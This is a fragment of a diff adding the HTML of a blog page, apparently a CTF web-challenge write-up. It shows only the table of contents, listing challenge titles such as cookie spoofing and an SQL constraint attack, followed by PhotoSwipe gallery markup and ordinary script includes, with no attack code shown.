href="#web18-%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E"><span class="toc-number">8.</span> <span class="toc-text">web18-秋名山车神</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web19-%E9%80%9F%E5%BA%A6%E8%A6%81%E5%BF%AB"><span class="toc-number">9.</span> <span class="toc-text">web19-速度要快</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web20-cookie%E6%AC%BA%E9%AA%97"><span class="toc-number">10.</span> <span class="toc-text">web20-cookie欺骗</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web21"><span class="toc-number">11.</span> <span class="toc-text">web21</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web24"><span class="toc-number">12.</span> <span class="toc-text">web24</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#we25-SQL%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB"><span class="toc-number">13.</span> <span class="toc-text">we25-SQL约束攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web26-google"><span class="toc-number">14.</span> <span class="toc-text">web26-google</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xxx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA"><span class="toc-number">15.</span> <span class="toc-text">xxx二手交易市场</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
